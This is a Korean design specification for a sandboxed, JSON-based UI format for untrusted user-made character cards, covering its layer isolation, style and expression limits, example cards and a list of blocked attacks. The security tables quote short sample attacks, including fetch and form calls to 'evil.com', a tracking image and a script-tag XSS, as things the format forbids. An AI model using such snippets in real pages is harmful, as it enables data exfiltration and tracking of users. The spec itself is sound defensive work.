# Safe UGC UI - 설계 스펙 v0.3

> **목표**: 신뢰할 수 없는 사용자가 작성한 UI 코드를, 다른 사용자의 환경에서 안전하게 실행

> **철학**: "유저가 보안을 신경 쓸 필요가 없게"

> **Note (2026-01-31):** Phase 2 구현이 완료되었습니다. 현재 동작 스펙은 `safe-ugc-ui-card-spec.md`를 기준으로 하세요. 이 문서는 설계 히스토리용입니다.

---

## 변경 이력

| 버전 | 날짜       | 변경 내용                                                              |
| ---- | ---------- | ---------------------------------------------------------------------- |
| v0.1 | 2026-01-30 | 초기 스펙                                                              |
| v0.2 | 2026-01-30 | gradient 구조화, 표현식 강화, CSS 제한 추가, 레이어 격리 명시          |
| v0.3 | 2026-01-30 | position 규칙 통합, 값 타입 시스템 명시, 전체 크기 제한, overflow 제한 |

---

## 1. 보안 모델

### 1.1 절대 금지 (협상 불가)

| 항목               | 이유                | 공격 예시                                |
| ------------------ | ------------------- | ---------------------------------------- |
| 외부 네트워크 요청 | 데이터 유출         | `fetch("https://evil.com/?data=...")`    |
| 외부 리소스 로드   | 트래킹, 데이터 유출 | `<img src="https://evil.com/track.gif">` |
| url() 함수         | CSS 통한 외부 요청  | `background: url("https://evil.com")`    |
| 이벤트 핸들러      | 임의 코드 실행      | `onclick="stealData()"`                  |
| script 태그        | 임의 코드 실행      | `<script>alert('xss')</script>`          |
| 민감한 입력 필드   | 피싱                | `<input type="password">`                |
| form 태그          | 데이터 외부 전송    | `<form action="https://evil.com">`       |
| iframe             | 샌드박스 탈출       | `<iframe src="...">`                     |
| 임의 JavaScript    | 모든 공격 가능      | `eval()`, `Function()`                   |
| 무한 루프          | DoS                 | `while(true) {}`                         |
| 과도한 재귀        | 스택 오버플로우     | 깊은 재귀 호출                           |

### 1.2 허용

| 항목            | 조건                            |
| --------------- | ------------------------------- |
| 로컬 에셋 참조  | `@assets/` 경로만               |
| 색상            | HEX, RGB, HSL, 색상명           |
| 그라데이션      | 구조화된 형식만 (섹션 3.4 참조) |
| 레이아웃 스타일 | padding, margin, gap 등         |
| 크기            | px, %, em, rem, auto            |
| 테두리/모서리   | border, borderRadius            |
| 그림자          | 구조화된 형식만 (섹션 3.5 참조) |
| 투명도          | opacity                         |
| 상태 바인딩     | `$변수명` (읽기 전용)           |
| 조건부 렌더링   | `if/then/else`                  |
| 반복 렌더링     | `for...in` (횟수 제한)          |
| 기본 연산       | 사칙연산, 비교, 논리 연산       |

### 1.3 레이어 격리

**핵심 원칙**: UGC는 절대로 플랫폼 UI 위에 렌더링될 수 없다.

```
┌─────────────────────────────────────────────┐
│  z-index: 9999+                             │
│  플랫폼 UI (헤더, 모달, 토스트 등)            │
│  ※ UGC가 절대 도달할 수 없는 영역            │
├─────────────────────────────────────────────┤
│  z-index: 0-100 (UGC 허용 범위)             │
│  ┌─────────────────────────────────────┐   │
│  │  UGC 컨테이너 (overflow: hidden)    │   │
│  │  ┌─────────────────────────────┐   │   │
│  │  │     캐릭터 카드 UI          │   │   │
│  │  └─────────────────────────────┘   │   │
│  └─────────────────────────────────────┘   │
└─────────────────────────────────────────────┘
```

**구현 요구사항:**

- UGC 컨테이너에 `overflow: hidden` 강제
- UGC 내부 `zIndex`는 0-100 범위로 제한
- `transform: scale()`은 1.5 이하로 제한
- position 규칙은 섹션 3.3 참조 (단일 정의)

### 1.4 범위 외 사항

다음은 Safe UGC UI 스펙의 **기술적 범위 밖**이지만, 플랫폼이 별도로 대응해야 함:

**사회공학 공격:**

```
캐릭터: "게임하자! 진짜 전화번호 알려줘~"
유저: "010-1234-5678" (자발적 입력)
```

이는 입력 필드 없이도 발생 가능하며, 기술로 100% 차단 불가.

**플랫폼 레벨 권장 대응:**

- 채팅 내 민감정보 패턴 감지 시 경고 표시
- 신고/차단/리포트 UX 제공
- 카드 업로드 시 가이드라인 동의
- 커뮤니티 모더레이션

---

## 2. 프리미티브 목록

### 2.1 레이아웃

| 컴포넌트 | 설명                       | position 허용          |
| -------- | -------------------------- | ---------------------- |
| Box      | 범용 컨테이너              | static, relative       |
| Row      | 가로 배치 (flexbox row)    | static, relative       |
| Column   | 세로 배치 (flexbox column) | static, relative       |
| Stack    | 겹치기 컨테이너            | 자식에게 absolute 허용 |
| Grid     | 그리드 레이아웃            | static, relative       |
| Spacer   | 빈 공간                    | static                 |

### 2.2 콘텐츠

| 컴포넌트 | 설명                      |
| -------- | ------------------------- |
| Text     | 텍스트 표시               |
| Image    | 이미지 (로컬 에셋만)      |
| Icon     | 아이콘 (플랫폼 제공 세트) |
| Divider  | 구분선                    |

### 2.3 표시 컴포넌트

| 컴포넌트    | 설명                 |
| ----------- | -------------------- |
| ProgressBar | 게이지/프로그레스 바 |
| Badge       | 태그/뱃지            |
| Avatar      | 프로필 이미지 (원형) |
| Chip        | 작은 태그            |

### 2.4 (선택) 제한된 인터랙션

| 컴포넌트 | 설명 | 조건               |
| -------- | ---- | ------------------ |
| Button   | 버튼 | 플랫폼 정의 액션만 |
| Toggle   | 토글 | 로컬 상태 변경만   |

---

## 3. 스타일 시스템

### 3.1 레이아웃 속성

```yaml
# Flexbox
display: [flex, block, none]
flexDirection: [row, column, row-reverse, column-reverse]
justifyContent: [start, center, end, space-between, space-around, space-evenly]
alignItems: [start, center, end, stretch, baseline]
alignSelf: [auto, start, center, end, stretch]
flexWrap: [nowrap, wrap, wrap-reverse]
flex: <number>
gap: <length>

# 크기
width: <length> | <percentage> | auto
height: <length> | <percentage> | auto
minWidth: <length> | <percentage>
maxWidth: <length> | <percentage>
minHeight: <length> | <percentage>
maxHeight: <length> | <percentage>

# 여백
padding: <length>
paddingTop/Right/Bottom/Left: <length>
margin: <length>
marginTop/Right/Bottom/Left: <length>
```

### 3.2 Overflow 규칙 (v0.3: 제한 강화)

```yaml
overflow: [visible, hidden, auto]
# scroll: ❌ 금지 (스크롤 재킹 방지)
```

**추가 제한:**

- `overflow: auto` 사용 가능 컴포넌트: **카드당 최대 2개**
- 중첩된 `overflow: auto`는 금지 (부모가 auto면 자식은 불가)

### 3.3 Position 규칙 (v0.3: 단일 정의)

**이 섹션이 position에 대한 유일한 규칙입니다.**

| position 값 | 허용 여부 | 조건                             |
| ----------- | --------- | -------------------------------- |
| `static`    | ✅ 허용   | 항상                             |
| `relative`  | ✅ 허용   | 항상                             |
| `absolute`  | ⚠️ 조건부 | Stack 컴포넌트의 직접 자식에서만 |
| `fixed`     | ❌ 금지   | 항상                             |
| `sticky`    | ❌ 금지   | 항상                             |

**absolute 허용 조건 상세:**

```json
{
  "type": "Stack",
  "children": [
    {
      "type": "Box",
      "style": { "position": "absolute", "top": 0, "left": 0 }
    },
    {
      "type": "Box",
      "style": { "position": "absolute", "bottom": 10, "right": 10 }
    }
  ]
}
```

- Stack은 내부적으로 `position: relative`가 강제됨
- Stack의 **직접 자식**만 `position: absolute` 사용 가능
- Stack의 손자(자식의 자식)는 absolute 불가
- absolute 요소는 Stack 경계 밖으로 렌더링 불가 (Stack에 `overflow: hidden` 강제)

**z-index 규칙:**

- 허용 범위: 0-100
- 기본값: 0
- Stack 내부에서만 의미 있음

### 3.4 그라데이션 (구조화 필수)

**문자열 금지, 객체만 허용:**

```json
{
  "backgroundGradient": {
    "type": "linear",
    "direction": "135deg",
    "stops": [
      { "color": "#1a1a2e", "position": "0%" },
      { "color": "#16213e", "position": "100%" }
    ]
  }
}
```

**허용되는 그라데이션 타입:**

- `linear`: 선형 그라데이션
- `radial`: 원형 그라데이션 (선택적 지원)

**금지:**

- `url()` 포함 불가
- `var()` 포함 불가
- 문자열로 직접 작성 불가

### 3.5 그림자 (구조화 필수)

```json
{
  "boxShadow": {
    "offsetX": 0,
    "offsetY": 4,
    "blur": 12,
    "spread": 0,
    "color": "rgba(0,0,0,0.15)"
  }
}
```

**다중 그림자 (배열):**

```json
{
  "boxShadow": [
    { "offsetX": 0, "offsetY": 2, "blur": 4, "color": "rgba(0,0,0,0.1)" },
    { "offsetX": 0, "offsetY": 4, "blur": 8, "color": "rgba(0,0,0,0.1)" }
  ]
}
```

**제한:**

- 그림자 최대 개수: 5개
- blur 최대값: 100px
- spread 최대값: 50px

### 3.6 Transform (제한된 허용)

```json
{
  "transform": {
    "rotate": "45deg",
    "scale": 1.2,
    "translateX": 10,
    "translateY": 10
  }
}
```

**제한:**

| 속성         | 허용 범위        | 이유               |
| ------------ | ---------------- | ------------------ |
| scale        | 0.1 ~ 1.5        | UI 덮기 방지       |
| rotate       | -360deg ~ 360deg | 자유               |
| translateX/Y | -500px ~ 500px   | 컨테이너 탈출 방지 |
| skew         | ❌ 금지          | 피싱 UI 방지       |

### 3.7 시각적 속성

```yaml
# 배경
backgroundColor: <color>
backgroundGradient: <GradientObject> # 섹션 3.4 참조

# 테두리
border: <BorderObject> # { width, style, color }
borderRadius: <length> # 최대 9999px
borderTop/Right/Bottom/Left: <BorderObject>

# 그림자
boxShadow: <ShadowObject> | <ShadowObject[]> # 섹션 3.5 참조

# 텍스트
color: <color>
fontSize: <length> # 8px ~ 72px
fontWeight: [normal, bold, 100-900]
fontStyle: [normal, italic]
textAlign: [left, center, right, justify]
textDecoration: [none, underline, line-through]
lineHeight: <number> | <length>
letterSpacing: <length> # -10px ~ 50px

# 기타
opacity: <number> # 0 ~ 1
```

### 3.8 금지 속성

```yaml
# 완전 금지 - 외부 리소스 가능
backgroundImage: ❌
cursor: ❌
listStyleImage: ❌
content: ❌

# 완전 금지 - 레이어 탈출 (섹션 3.3에서 통합 관리)
# position: fixed → 3.3 참조
# position: sticky → 3.3 참조

# 완전 금지 - 성능/속임수
filter: ❌
backdropFilter: ❌
mixBlendMode: ❌

# 완전 금지 - 복잡한 시각 조작
animation: ❌
transition: ❌
clipPath: ❌
mask: ❌
```

---

## 4. 값 타입 시스템 (v0.3: 신규)

### 4.1 기본 타입

```typescript
type Literal<T> = T; // 직접 값
type Ref = { $ref: string }; // 상태 참조
type Expr = { $expr: string }; // 표현식
type Dynamic<T> = T | Ref | Expr; // 동적 값 (셋 다 가능)
type RefOnly<T> = T | Ref; // 참조만 (표현식 금지)
type Static<T> = T; // 정적만 (동적 금지)
```

### 4.2 컴포넌트별 Props 타입

**위험도가 높은 속성은 동적 값을 제한합니다.**

```typescript
// Image - src는 참조만 허용 (표현식으로 URL 조작 방지)
interface ImageProps {
  src: Static<AssetPath> | Ref; // ✅ "@assets/img.png" 또는 { $ref: "$imgPath" }
  // ❌ { $expr: "..." } 금지
  alt?: Dynamic<string>; // 표현식 허용
  width?: Dynamic<Length>;
  height?: Dynamic<Length>;
}

// Text - content는 모두 허용
interface TextProps {
  content: Dynamic<string>; // 모두 허용
}

// ProgressBar - value/max는 모두 허용
interface ProgressBarProps {
  value: Dynamic<number>;
  max: Dynamic<number>;
  color?: Dynamic<Color>;
}

// Avatar - src는 Image와 동일하게 제한
interface AvatarProps {
  src: Static<AssetPath> | Ref; // 표현식 금지
  size?: Dynamic<Length>;
}

// Icon - name은 정적만
interface IconProps {
  name: Static<IconName>; // 플랫폼 정의 아이콘만
  size?: Dynamic<Length>;
  color?: Dynamic<Color>;
}

// Badge
interface BadgeProps {
  label: Dynamic<string>;
  color?: Dynamic<Color>;
}
```

### 4.3 스타일 속성 타입

```typescript
interface StyleProps {
  // 레이아웃 - 모두 동적 허용
  width?: Dynamic<Length | Percentage | 'auto'>;
  height?: Dynamic<Length | Percentage | 'auto'>;
  padding?: Dynamic<Length>;
  margin?: Dynamic<Length>;
  gap?: Dynamic<Length>;
  flex?: Dynamic<number>;

  // 색상 - 모두 동적 허용
  backgroundColor?: Dynamic<Color>;
  color?: Dynamic<Color>;

  // 구조화된 객체 - 정적만 (복잡도 제한)
  backgroundGradient?: Static<GradientObject>;
  boxShadow?: Static<ShadowObject | ShadowObject[]>;
  border?: Static<BorderObject>;
  transform?: Static<TransformObject>;

  // position - 정적만 (보안)
  position?: Static<'static' | 'relative' | 'absolute'>;
  top?: Static<Length>;
  right?: Static<Length>;
  bottom?: Static<Length>;
  left?: Static<Length>;
  zIndex?: Static<number>; // 0-100
}
```

### 4.4 AssetPath 타입

```typescript
// 로컬 에셋만 허용
type AssetPath = `@assets/${string}`;

// 유효한 예
('@assets/character.png');
('@assets/icons/heart.svg');
('@assets/sounds/click.mp3');

// 무효한 예
('https://example.com/image.png'); // ❌ 외부 URL
('/images/photo.jpg'); // ❌ 절대 경로
('../other/file.png'); // ❌ 상대 경로
```

### 4.5 검증 규칙 요약

| 속성 유형    | Literal | $ref | $expr |
| ------------ | ------- | ---- | ----- |
| Image.src    | ✅      | ✅   | ❌    |
| Avatar.src   | ✅      | ✅   | ❌    |
| Icon.name    | ✅      | ❌   | ❌    |
| Text.content | ✅      | ✅   | ✅    |
| 색상 속성    | ✅      | ✅   | ✅    |
| 크기 속성    | ✅      | ✅   | ✅    |
| position     | ✅      | ❌   | ❌    |
| transform    | ✅      | ❌   | ❌    |
| gradient     | ✅      | ❌   | ❌    |

---

## 5. 표현식 문법

### 5.1 제한 수치

| 제한               | 값          | 이유          |
| ------------------ | ----------- | ------------- |
| 표현식 문자열 길이 | 최대 500자  | 파싱 DoS 방지 |
| 토큰 수            | 최대 50개   | 복잡도 제한   |
| 중첩 깊이          | 최대 10단계 | 스택 보호     |
| 문자열 리터럴 길이 | 최대 1000자 | 메모리 보호   |

### 5.2 변수 참조

```
$hp              # 상태 변수
$messages        # 배열
$msg.sender      # 객체 속성 (깊이 최대 5단계)
$messages[0]     # 배열 인덱스 (인덱스 최대 9999)
```

### 5.3 리터럴

```
100              # 정수
3.14             # 실수 (소수점 이하 최대 10자리)
"hello"          # 문자열 (최대 1000자)
true / false     # 불리언
```

### 5.4 연산자 (완전한 목록)

```yaml
# 산술 (5개)
+      # 덧셈, 문자열 연결
-      # 뺄셈
*      # 곱셈
/      # 나눗셈 (0으로 나누면 에러)
%      # 나머지

# 비교 (6개)
==     # 같음 (타입 강제 변환 없음)
!=     # 다름
<      # 작음 (숫자만)
<=     # 작거나 같음 (숫자만)
>      # 큼 (숫자만)
>=     # 크거나 같음 (숫자만)

# 논리 (3개)
and    # 논리 AND
or     # 논리 OR
not    # 논리 NOT

# 명시적으로 없는 연산자
===, !==, &&, ||, !  # 금지
```

### 5.5 타입 비교 규칙

**원칙: 암묵적 타입 변환 없음**

```yaml
# 같은 타입끼리만 비교 가능
100 == 100       # ✅ true
"100" == "100"   # ✅ true
100 == "100"     # ❌ 에러: 타입 불일치

# 숫자 대소 비교만 가능
100 < 200        # ✅ true
"a" < "b"        # ❌ 에러: 문자열 대소 비교 불가

# 문자열 연결 (+ 연산자에서만 타입 변환 허용)
"HP: " + 100     # ✅ "HP: 100"
100 + "점"       # ✅ "100점"
```

### 5.6 조건식

```
if $hp < 20 then "위험" else "정상"
```

**제한:**

- 중첩 최대 3단계
- else 필수

### 5.7 연산자 우선순위

```
1. not
2. * / %
3. + -
4. < <= > >=
5. == !=
6. and
7. or
8. if/then/else
```

### 5.8 반복 (뷰 내에서)

```
for msg in $messages { ... }
```

**제한:**

- 최대 반복 횟수: 1000회
- 중첩 반복 최대: 2단계

### 5.9 금지 (명시적)

```yaml
# 함수 호출 - 전부 금지
fetch(), eval(), alert(), Math.random(), console.log()

# 할당 - 금지
$hp = 100

# 객체/배열 생성 - 금지
{ key: value }, [1, 2, 3]

# 기타 - 금지
typeof, instanceof, new, delete
```

### 5.10 에러 처리

```yaml
타입 불일치: 에러 표시 + 기본값
0으로 나눔: 에러 표시 + 기본값
존재하지 않는 변수: 에러 표시 + 기본값
범위 초과: 에러 표시 + 기본값

# 기본값 정책
숫자 컨텍스트: 0
문자열 컨텍스트: ''
불리언 컨텍스트: false
```

---

## 6. 리소스 제한 (v0.3: 전체 크기 추가)

### 6.1 카드 전체 제한

| 리소스                  | 제한           | 이유          |
| ----------------------- | -------------- | ------------- |
| **카드 JSON 전체 크기** | **최대 1MB**   | 파싱 DoS 방지 |
| **Text content 총합**   | **최대 200KB** | 메모리 보호   |
| **style 객체 총 크기**  | **최대 100KB** | 복잡도 제한   |
| 에셋 개별 크기          | 최대 5MB       | 대역폭        |
| 에셋 총합               | 최대 50MB      | 저장소        |

### 6.2 렌더링 제한

| 리소스                  | 제한         | 이유           |
| ----------------------- | ------------ | -------------- |
| 렌더링 노드 수          | 최대 10000개 | 메모리/성능    |
| 반복 횟수               | 최대 1000회  | DoS 방지       |
| 중첩 반복               | 최대 2단계   | 복잡도         |
| **overflow: auto 개수** | **최대 2개** | UX/스크롤 재킹 |
| Stack 중첩              | 최대 3단계   | 복잡도         |

### 6.3 표현식 제한

| 리소스         | 제한        | 이유      |
| -------------- | ----------- | --------- |
| 표현식 길이    | 최대 500자  | 파싱 DoS  |
| 토큰 수        | 최대 50개   | 복잡도    |
| 중첩 깊이      | 최대 10단계 | 스택 보호 |
| 조건문 중첩    | 최대 3단계  | 가독성    |
| 문자열 리터럴  | 최대 1000자 | 메모리    |
| 변수 참조 깊이 | 최대 5단계  | 복잡도    |
| 배열 인덱스    | 최대 9999   | 범위      |

### 6.4 스타일 제한

| 리소스              | 제한           | 이유         |
| ------------------- | -------------- | ------------ |
| z-index             | 0-100          | 레이어 격리  |
| transform scale     | 0.1-1.5        | UI 덮기 방지 |
| transform translate | -500px ~ 500px | 탈출 방지    |
| fontSize            | 8-72px         | 가독성       |
| boxShadow 개수      | 최대 5개       | 성능         |
| boxShadow blur      | 최대 100px     | 성능         |
| borderRadius        | 최대 9999px    | 합리적 범위  |

---

## 7. 예제 카드

### 7.1 카카오톡 UI

```json
{
  "meta": {
    "name": "KakaoChat",
    "version": "1.0.0"
  },
  "assets": {
    "profile": "@assets/profile.png"
  },
  "state": {
    "messages": [
      { "sender": "엘리스", "text": "오빠 지금 어디야?", "time": "오후 3:42", "mine": false },
      { "sender": "나", "text": "집", "time": "오후 3:43", "mine": true }
    ]
  },
  "views": {
    "KakaoChat": {
      "type": "Box",
      "style": {
        "backgroundColor": "#b2c7d9",
        "padding": 12,
        "borderRadius": 8
      },
      "children": {
        "for": "msg",
        "in": "$messages",
        "template": {
          "type": "Row",
          "style": {
            "justifyContent": { "$expr": "if $msg.mine then 'end' else 'start'" },
            "marginBottom": 8,
            "gap": 8
          },
          "children": [
            {
              "type": "Avatar",
              "condition": { "$expr": "not $msg.mine" },
              "props": {
                "src": "@assets/profile.png",
                "size": 36
              }
            },
            {
              "type": "Column",
              "style": { "gap": 4 },
              "children": [
                {
                  "type": "Text",
                  "condition": { "$expr": "not $msg.mine" },
                  "props": { "content": { "$ref": "$msg.sender" } },
                  "style": { "fontSize": 12, "color": "#666666" }
                },
                {
                  "type": "Box",
                  "style": {
                    "backgroundColor": { "$expr": "if $msg.mine then '#fee500' else '#ffffff'" },
                    "padding": 10,
                    "borderRadius": 12
                  },
                  "children": [
                    {
                      "type": "Text",
                      "props": { "content": { "$ref": "$msg.text" } }
                    }
                  ]
                },
                {
                  "type": "Text",
                  "props": { "content": { "$ref": "$msg.time" } },
                  "style": { "fontSize": 10, "color": "#999999" }
                }
              ]
            }
          ]
        }
      }
    }
  }
}
```

### 7.2 RPG 상태창

```json
{
  "meta": {
    "name": "RPGStatus",
    "version": "1.0.0"
  },
  "assets": {
    "character": "@assets/character.png"
  },
  "state": {
    "name": "엘리스",
    "level": 15,
    "hp": 45,
    "maxHp": 100,
    "mp": 30,
    "maxMp": 50,
    "statusEffects": [
      { "name": "독", "color": "#9b59b6" },
      { "name": "감속", "color": "#3498db" }
    ]
  },
  "views": {
    "StatusWindow": {
      "type": "Box",
      "style": {
        "backgroundGradient": {
          "type": "linear",
          "direction": "135deg",
          "stops": [
            { "color": "#1a1a2e", "position": "0%" },
            { "color": "#16213e", "position": "100%" }
          ]
        },
        "padding": 16,
        "borderRadius": 12,
        "border": { "width": 1, "style": "solid", "color": "#e94560" }
      },
      "children": [
        {
          "type": "Row",
          "style": { "gap": 12, "marginBottom": 16 },
          "children": [
            {
              "type": "Avatar",
              "props": { "src": "@assets/character.png", "size": 64 }
            },
            {
              "type": "Column",
              "children": [
                {
                  "type": "Text",
                  "props": { "content": { "$ref": "$name" } },
                  "style": { "fontSize": 18, "fontWeight": "bold", "color": "#ffffff" }
                },
                {
                  "type": "Text",
                  "props": { "content": { "$expr": "'Lv.' + $level" } },
                  "style": { "fontSize": 14, "color": "#e94560" }
                }
              ]
            }
          ]
        },
        {
          "type": "Column",
          "style": { "gap": 8 },
          "children": [
            {
              "type": "Row",
              "style": { "alignItems": "center", "gap": 8 },
              "children": [
                {
                  "type": "Text",
                  "props": { "content": "HP" },
                  "style": { "color": "#ffffff", "width": 30 }
                },
                {
                  "type": "ProgressBar",
                  "props": {
                    "value": { "$ref": "$hp" },
                    "max": { "$ref": "$maxHp" },
                    "color": { "$expr": "if $hp < 20 then '#ff4444' else '#44ff44'" }
                  },
                  "style": { "flex": 1 }
                },
                {
                  "type": "Text",
                  "props": { "content": { "$expr": "$hp + '/' + $maxHp" } },
                  "style": { "color": "#ffffff", "fontSize": 12 }
                }
              ]
            },
            {
              "type": "Row",
              "style": { "alignItems": "center", "gap": 8 },
              "children": [
                {
                  "type": "Text",
                  "props": { "content": "MP" },
                  "style": { "color": "#ffffff", "width": 30 }
                },
                {
                  "type": "ProgressBar",
                  "props": {
                    "value": { "$ref": "$mp" },
                    "max": { "$ref": "$maxMp" },
                    "color": "#4444ff"
                  },
                  "style": { "flex": 1 }
                },
                {
                  "type": "Text",
                  "props": { "content": { "$expr": "$mp + '/' + $maxMp" } },
                  "style": { "color": "#ffffff", "fontSize": 12 }
                }
              ]
            }
          ]
        },
        {
          "type": "Row",
          "style": { "marginTop": 12, "gap": 8, "flexWrap": "wrap" },
          "children": {
            "for": "status",
            "in": "$statusEffects",
            "template": {
              "type": "Badge",
              "props": {
                "label": { "$ref": "$status.name" },
                "color": { "$ref": "$status.color" }
              }
            }
          }
        }
      ]
    }
  }
}
```

### 7.3 SNS 포스트

```json
{
  "meta": {
    "name": "Tweet",
    "version": "1.0.0"
  },
  "assets": {
    "avatar": "@assets/avatar.png"
  },
  "state": {
    "displayName": "엘리스",
    "username": "elice_knight",
    "time": "2시간",
    "content": "오늘 훈련 끝! 검술 실력이 많이 늘었다 💪",
    "hasImage": false,
    "imageSrc": "@assets/empty.png",
    "replies": 12,
    "retweets": 34,
    "likes": 256,
    "liked": true
  },
  "views": {
    "Tweet": {
      "type": "Box",
      "style": {
        "backgroundColor": "#ffffff",
        "padding": 16,
        "border": { "width": 1, "style": "solid", "color": "#eeeeee" }
      },
      "children": [
        {
          "type": "Row",
          "style": { "gap": 12 },
          "children": [
            {
              "type": "Avatar",
              "props": { "src": "@assets/avatar.png", "size": 48 }
            },
            {
              "type": "Column",
              "style": { "flex": 1, "gap": 4 },
              "children": [
                {
                  "type": "Row",
                  "style": { "gap": 4, "alignItems": "center" },
                  "children": [
                    {
                      "type": "Text",
                      "props": { "content": { "$ref": "$displayName" } },
                      "style": { "fontWeight": "bold" }
                    },
                    {
                      "type": "Text",
                      "props": { "content": { "$expr": "'@' + $username" } },
                      "style": { "color": "#666666" }
                    },
                    {
                      "type": "Text",
                      "props": { "content": "·" },
                      "style": { "color": "#666666" }
                    },
                    {
                      "type": "Text",
                      "props": { "content": { "$ref": "$time" } },
                      "style": { "color": "#666666" }
                    }
                  ]
                },
                {
                  "type": "Text",
                  "props": { "content": { "$ref": "$content" } },
                  "style": { "lineHeight": 1.4 }
                },
                {
                  "type": "Image",
                  "condition": { "$expr": "$hasImage" },
                  "props": { "src": { "$ref": "$imageSrc" } },
                  "style": { "borderRadius": 12, "marginTop": 8 }
                },
                {
                  "type": "Row",
                  "style": { "marginTop": 12, "gap": 48 },
                  "children": [
                    {
                      "type": "Row",
                      "style": { "gap": 8, "alignItems": "center" },
                      "children": [
                        {
                          "type": "Icon",
                          "props": { "name": "comment", "size": 18, "color": "#666666" }
                        },
                        {
                          "type": "Text",
                          "props": { "content": { "$ref": "$replies" } },
                          "style": { "color": "#666666", "fontSize": 13 }
                        }
                      ]
                    },
                    {
                      "type": "Row",
                      "style": { "gap": 8, "alignItems": "center" },
                      "children": [
                        {
                          "type": "Icon",
                          "props": { "name": "retweet", "size": 18, "color": "#666666" }
                        },
                        {
                          "type": "Text",
                          "props": { "content": { "$ref": "$retweets" } },
                          "style": { "color": "#666666", "fontSize": 13 }
                        }
                      ]
                    },
                    {
                      "type": "Row",
                      "style": { "gap": 8, "alignItems": "center" },
                      "children": [
                        {
                          "type": "Icon",
                          "props": {
                            "name": "heart",
                            "size": 18,
                            "color": { "$expr": "if $liked then '#e0245e' else '#666666'" }
                          }
                        },
                        {
                          "type": "Text",
                          "props": { "content": { "$ref": "$likes" } },
                          "style": { "color": "#666666", "fontSize": 13 }
                        }
                      ]
                    }
                  ]
                }
              ]
            }
          ]
        }
      ]
    }
  }
}
```

---

## 8. 보안 반례 테스트

### 8.1 피싱 UI 공격

```
공격 시도: 가짜 로그인 화면 + 정보 수집
방어:
  - input/form 프리미티브 없음 ✅
  - 외부 전송 경로 없음 ✅
  - 레이어 격리로 플랫폼 UI 덮기 불가 ✅

결과: 구조적으로 불가능 ✅
```

### 8.2 외부 데이터 유출

```
공격 시도: 사용자 데이터 외부 전송
방어:
  - fetch() 함수 없음 ✅
  - Image.src에 $expr 금지 → URL 조작 불가 ✅
  - 외부 URL 자체가 불가 ✅

결과: 구조적으로 불가능 ✅
```

### 8.3 XSS / 스크립트 실행

```
공격 시도: JavaScript 코드 실행
방어:
  - script 프리미티브 없음 ✅
  - 이벤트 핸들러 없음 ✅
  - 표현식에서 함수 호출 금지 ✅

결과: 구조적으로 불가능 ✅
```

### 8.4 트래킹

```
공격 시도: 사용자 추적
방어:
  - 외부 이미지 불가 (@assets/만) ✅
  - Image.src에 $expr 금지 ✅
  - 외부 CSS/폰트 불가 ✅

결과: 구조적으로 불가능 ✅
```

### 8.5 UI 덮어쓰기

```
공격 시도: 플랫폼 UI 위에 가짜 UI
방어:
  - position: fixed 금지 ✅
  - z-index 0-100 제한 (플랫폼은 9999+) ✅
  - transform scale 1.5 제한 ✅
  - UGC 컨테이너 overflow: hidden ✅

결과: 구조적으로 불가능 ✅
```

### 8.6 DoS (서비스 거부)

```
공격 시도: 브라우저/렌더러 멈춤
방어:
  - 카드 JSON 크기 1MB 제한 ✅
  - 노드 수 10000개 제한 ✅
  - 반복 1000회 제한 ✅
  - 표현식 토큰 50개 제한 ✅
  - filter/backdropFilter 금지 ✅

결과: 제한으로 방어됨 ✅
```

### 8.7 동적 URL 우회

```
공격 시도: 표현식으로 외부 URL 생성
예: { "$expr": "if $hack then 'https://evil.com' else '@assets/img.png'" }
방어:
  - Image.src에 $expr 금지 ✅
  - Avatar.src에 $expr 금지 ✅
  - AssetPath 타입 검증 ✅

결과: 타입 시스템으로 차단 ✅
```

---

## 9. 구현 로드맵

### Phase 1: MVP (2-4주)

- [ ] TypeScript 타입 정의 (섹션 4 기반)
- [ ] JSON 스키마 생성
- [ ] 값 타입 검증기 ($ref, $expr 제한)
- [ ] 보안 규칙 검증기
- [ ] 기본 React 렌더러 (Box, Row, Column, Text, Image)
- [ ] 레이어 격리 컨테이너

### Phase 2: 완성도 (4-6주)

- [ ] 나머지 프리미티브 (ProgressBar, Avatar, Badge, Icon, Stack)
- [ ] 표현식 파서/평가기
- [ ] 반복 렌더링 (for...in)
- [ ] 그라데이션/그림자 렌더링
- [ ] 리소스 제한 검증 (크기, 개수)
- [ ] 에러 메시지

### Phase 3: 통합 (2-4주)

- [ ] RebelAI 통합
- [ ] CharX → Safe UI 변환 도구
- [ ] 카드 미리보기
- [ ] 문서화

### Phase 4: (선택) 문법 설탕

- [ ] CharLang 텍스트 문법
- [ ] CharLang → JSON 컴파일러
- [ ] 에디터 지원

---

## 10. 패키지 구조

```
@safe-ugc-ui/
├── types/              # TypeScript 타입
│   ├── primitives.ts   # 컴포넌트 타입
│   ├── props.ts        # Props 타입 (v0.3: 값 타입 포함)
│   ├── styles.ts       # 스타일 타입
│   ├── values.ts       # v0.3: Dynamic/Ref/Expr 타입
│   └── index.ts
│
├── validator/          # 검증기
│   ├── schema.ts       # 구조 검증
│   ├── security.ts     # 보안 규칙
│   ├── limits.ts       # 리소스 제한
│   ├── types.ts        # v0.3: 값 타입 검증
│   └── index.ts
│
├── runtime/            # React 렌더러
│   ├── components/     # 프리미티브
│   ├── expression/     # 표현식 평가기
│   ├── container.tsx   # 레이어 격리
│   └── index.ts
│
├── cli/                # CLI 도구
│   ├── validate.ts
│   └── preview.ts
│
└── lang/               # (Phase 4)
    ├── lexer.ts
    ├── parser.ts
    └── compiler.ts
```

---

## 11. 열린 질문들

### 결정 필요

- [ ] 애니메이션/트랜지션: 제한적 허용?
- [ ] 사운드: 로컬 에셋으로 허용?
- [ ] 커스텀 폰트: 로컬 에셋으로 허용?
- [ ] radial-gradient 지원?
- [ ] Button/Toggle 포함?

### 향후 검토

- [ ] 웹 접근성 (a11y)
- [ ] 다크모드
- [ ] 국제화 (RTL)
- [ ] 성능 최적화

---

_문서 버전: 0.3_
_최종 수정: 2026-01-30_
